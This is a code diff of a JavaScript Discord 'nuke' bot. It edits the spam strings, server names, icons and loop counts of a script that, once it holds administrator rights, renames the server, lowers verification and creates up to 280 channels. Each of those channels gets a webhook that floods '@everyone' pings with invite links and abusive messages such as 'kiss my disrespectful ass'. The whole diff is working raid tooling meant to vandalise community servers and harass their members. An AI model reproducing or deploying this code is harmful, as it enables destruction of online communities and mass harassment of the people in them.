@@ -368,25 +368,25 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  function randomT() {
-   var rand = ['@everyone https://discord.gg/z6jMqF5Yjn', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
+   var rand = ["https://images-ext-1.discordapp.net/external/eFAPb9A-KDB8CcJsMlLwXi_iBL3EBaru-3b-CueTnRA/https/cdn.discordapp.com/icons/782621562154254356/9efdc64eb1b2548f27eda9938af40720.webp", '@everyone https://discord.gg/z6jMqF5Yjn', "🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE \n🍬🎄❄ MERRY CHRISTMAS EVERYONE ", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://images-ext-2.discordapp.net/external/1RImRRcAupiTBBfcQ2aKa7cj_meZCQI9JIpIGSt-VbU/%3Fsize%3D1024/https/cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png"]
  return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomnames() {
-   var rand = ["🍬🎄❄", "🍬🎄❄", "🍬🎄❄匚卄卂ㄖ丂🍬🎄❄", "🍬🎄❄pray.🍬🎄❄", "🍬🎄❄CHAOS CHAOS🍬🎄❄", "🍬🎄❄mine now🍬🎄❄", "🍬🎄❄THE TRUE AND NEO CHAOS🍬🎄❄", "🍬🎄❄卂丂丂ㄚs property now🍬🎄❄", "🍬🎄❄cubed.🍬🎄❄", "🍬🎄❄feel the 🎭CHAOS🎭🍬🎄❄", "🍬🎄❄oh oops!🍬🎄❄"]
+   var rand = ["『ΛDᄃ』", "『ΛDᄃ』", "🍬🎄❄", "🍬🎄❄", "🍬🎄❄匚卄卂ㄖ丂🍬🎄❄", "🍬🎄❄pray.🍬🎄❄", "🍬🎄❄CHAOS CHAOS🍬🎄❄", "🍬🎄❄mine now🍬🎄❄", "🍬🎄❄THE TRUE AND NEO CHAOS🍬🎄❄", "🍬🎄❄卂丂丂ㄚs property now🍬🎄❄", "🍬🎄❄cubed.🍬🎄❄", "🍬🎄❄feel the 🎭CHAOS🎭🍬🎄❄", "🍬🎄❄oh oops!🍬🎄❄"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomicons123() {
-   var rand = ["https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/avatars/759838559946801173/34648852c40e0b4822ff5101e5b5ffb4.png?size=1024"]
+   var rand = ["https://images-ext-2.discordapp.net/external/bDIbSf2nWsJsh4QHEYGhOn19DTNqksCGyeuM2YxLfwM/https/images-ext-2.discordapp.net/external/aUiSNo-HOBkCWlAFFjkSpOA2ishUAp2UH7mIzPrsJ7Q/%253Fsize%253D256/https/cdn.discordapp.com/avatars/761192480833142797/2212cb8ef2edee9b30487a56db8306b1.png", "https://media.discordapp.net/attachments/782641638798393364/783637979671298058/f260ee0bfe415dc7369de9459f9e28de.png", "https://cdn.discordapp.com/icons/751095375359770624/dddf4876e5f7496d12c64b2f7f82e72b.png?size=1024", "https://cdn.discordapp.com/avatars/759840501741518859/e96a11b39390687eed60f0bec3be64c1.png?size=1024", "https://cdn.discordapp.com/avatars/759838559946801173/34648852c40e0b4822ff5101e5b5ffb4.png?size=1024"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
 
  function channelnames() {
-   var rand = ["🍬🎄-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉", "🍬🎄🍬🎄🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "🍬🎄🍬🎄☜☝☟☞☝chaos☟chaos☝☜☟☝☞","🍬🎄♛♤♦♧♣♡♥♢♠♛", "🍬🎄♛♤♧♡♢chaos♠♣♥♦♛", "🍬🎄🃏🃏🃏", "🍬🎄🎭🎭🎭neo-chaos🎭🎭🎭", "🍬🎄ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "🍬🎄⬛⬛⬛⬛cubed⬛⬛⬛⬛", "🍬🎄❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒", "🍬🎄chaos-cube", "🍬🎄﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "🍬🎄匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "merry christmas"]
+   var rand = ["『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🍬🎄-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉-҉҉҉", "🍬🎄🍬🎄🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "🍬🎄🍬🎄☜☝☟☞☝chaos☟chaos☝☜☟☝☞","🍬🎄♛♤♦♧♣♡♥♢♠♛", "🍬🎄♛♤♧♡♢chaos♠♣♥♦♛", "🍬🎄🃏🃏🃏", "🍬🎄🎭🎭🎭neo-chaos🎭🎭🎭", "🍬🎄ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "🍬🎄⬛⬛⬛⬛cubed⬛⬛⬛⬛", "🍬🎄❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒cube❒", "🍬🎄chaos-cube", "🍬🎄﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "🍬🎄匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "merry christmas"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
@@ -420,13 +420,13 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
         var number = 0
         var pray = -1
         setTimeout(() => { 
-           msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
+           msg.guild.channels.create('☣️').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/hKVK9r7DGt @everyone")
                 p.send("kiss my disrespectful ass")
                 p.createWebhook("assy").then(w => {
                      
-                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
                     w.send("https://discord.gg/hKVK9r7DGt @everyone")
                     
                 
@@ -459,87 +459,12 @@ channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`))
 channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
 })
              })
-          while(pray < 2) {
-         msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
-            p.createWebhook("assy").then(w => {
-                     
-                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                    w.send(randomT() + " @everyone")
-                    
-                
-                })
-            
-            })
-            var spam = 0
-            while(spam < 15) 
-        {    
-            p.send(randomT() + " @everyone")
-            spam++
-        }
-         })
-            pray++
-         }
-         msg.guild.channels.create("ｐｒａｙ").then(p => {
-            p.createWebhook("assy").then(w => {
-                     
-                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                    w.send(randomT() + " @everyone")
-                    
-                
-                })
-            
-            })
-            var spam = 0
-            while(spam < 15) 
-        {    
-            p.send('kiss my disrespectful ass @everyone')
-            spam++
-        }
-         })
-         pray = -1
-         while(pray < 2) {
-            msg.guild.channels.create('匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂匚卄卂ㄖ丂').then(p => {
-               p.createWebhook("assy").then(w => {
-                        
-                   [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                       w.send(randomT() + " @everyone")
-                       
-                   
-                   })
-               
-               })
-               var spam = 0
-               while(spam < 15) 
-           {    
-               p.send(randomT() + " @everyone")
-               spam++
-           }
-            })
-               pray++
-            }
-            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
-                p.createWebhook("assy").then(w => {
-                         
-                    [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
-                        w.send(randomT() + " @everyone")
-                        
-                    
-                    })
-                
-                })
-                var spam = 0
-                while(spam < 15) 
-            {    
-                p.send(randomT() + " @everyone")
-                spam++
-            }
-             })
-        while(number < 180) {
+        while(number < 280) {
              msg.guild.channels.create(channelnames()).then(c => { 
                 
                  c.createWebhook("assy").then(w => {
                      
-                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
                          w.send(randomT() + " @everyone")
                          
                      
@@ -575,7 +500,7 @@ channel2.send(nukeEmbed).then(channel2.send(`discord.gg/${invite.code}`))
   setTimeout(() => {
      message.guild.setName(randomnames())
      message.guild.setIcon(randomicons123())
-     message.guild.setVerificationLevel("NONE")
+     message.guild.setVerificationLevel("LOW")
   }, 2000);
          
   }
